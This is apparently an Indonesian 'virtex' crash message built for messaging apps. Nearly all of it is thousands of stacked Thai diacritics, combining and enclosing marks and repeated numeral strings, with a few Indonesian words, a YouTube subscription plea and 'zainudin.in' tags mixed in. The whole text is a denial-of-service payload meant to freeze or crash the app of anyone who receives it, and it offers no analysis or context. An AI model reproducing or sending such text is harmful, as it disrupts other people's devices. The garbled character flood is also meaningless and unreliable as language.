⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🤣▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂😰*🇮🇩<[HM-Kolaborasi]>🇮🇩*<>[https://www.youtube.com/channel/UCtA4xax8I4DTk7Bv2JsfH7Q?Subscribe_confirmation=1]<>*Bantu subs+view+like+share=PAHALA!* *.➊➋ঔৣ͜͡𓃵⃟🥶࿐⁩* *D้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้isinัััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััi Sa้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้ya Tidaัััััััััััััััััััััััััััััััััััััััััััััััััััk*้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้ *Beัััััึึึึึึึึึึััััััััััััััึึึึึึึึึึrmaks้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้uัััััััััััััััััััััััััีีีีีีีีีัััััััd M้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้enantang* *⚘᭫ː͜͡✿⃝⃟݊ᤢོ۪🇮🇩ོོ͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ ⃢͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ ⃢⬤ ⃢͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ ⃢͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ��* ~*li鬒҈҈҉響҉҈ᬵ᬴鬒҈҉҈響҈҉ݜݼ響҉҈҉鬒҈҉ݜᬵ響҉҈鬒҈҉᬴ᬵ.li*~~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li鬒҈҈҉響҉҈ᬵ᬴鬒҈҉҈響҈҉ݜݼ響҉҈҉鬒҈҉ݜᬵ響҉҈鬒҈҉᬴ᬵ.li*~ *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* 🇮🇩ꭙࣼzɑinudin.in🇮🇩🇮🇩ꭙࣼzɑinudin.in🇮🇩 *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* 🇮🇩ꭙࣼzɑinudin.in🇮🇩🇮🇩ꭙࣼzɑinudin.in🇮🇩 *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* 